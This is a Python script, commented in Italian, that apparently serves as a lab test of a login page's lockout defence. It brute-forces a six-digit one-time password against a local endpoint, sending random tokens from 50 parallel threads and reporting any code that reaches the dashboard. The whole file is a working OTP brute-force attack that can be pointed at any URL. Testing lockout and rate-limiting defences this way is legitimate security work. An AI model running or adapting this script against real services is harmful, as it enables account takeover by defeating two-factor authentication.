import requests
import concurrent.futures
import random
import time

TARGET_URL = "http://127.0.0.1:5000/login"
MAX_WORKERS = 50       # Numero di thread
TOTAL_ATTEMPTS = 1000    # Quanti tentativi totali vogliamo provare

def attack(attempt_id):

    # Genera un codice OTP casuale a 6 cifre
    fake_token = str(random.randint(0, 999999)).zfill(6)
    
    payload = {'token': fake_token}
    
    try:
        # Inviamo la richiesta POST
        response = requests.post(TARGET_URL, data=payload, timeout=3)
        
        # CASO 1: Account Bloccato (Codice 403 Forbidden)
        if response.status_code == 403:
            return f"[{attempt_id}] BLOCKED: Il server ha rilevato l'attacco!"
            
        # CASO 2: Successo (Redirect alla dashboard)
        elif "dashboard" in response.url:
            return f"[{attempt_id}] SUCCESS: Codice trovato: {fake_token}"
            
        # CASO 3: Fallimento
        else:
            return f"[{attempt_id}] FAIL ({fake_token}): Codice errato."

    except requests.exceptions.RequestException as e:
        return f"[{attempt_id}] Errore di connessione al server"

def start_brute_force():
    print(f"AVVIO BRUTE FORCE SU: {TARGET_URL}")
    print(f"Threads: {MAX_WORKERS}")

    # Creiamo un Pool di Thread per lanciare le richieste in parallelo
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        # Prepariamo la lista dei task
        futures = [executor.submit(attack, i) for i in range(1, TOTAL_ATTEMPTS + 1)]
        
        # Man mano che i thread finiscono, stampiamo il risultato
        blocked_count = 0
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            print(result)
            
            # Se vediamo che siamo bloccati, contiamo. 
            # Se siamo bloccati da tutte le parti, possiamo anche fermare lo script.
            if "BLOCKED" in result:
                blocked_count += 1
                if blocked_count >= 5:
                    print("Il sistema di difesa ha funzionato. Account bloccato.")
                    executor.shutdown(wait=False, cancel_futures=True)
                    break

if __name__ == "__main__":
    start_brute_force()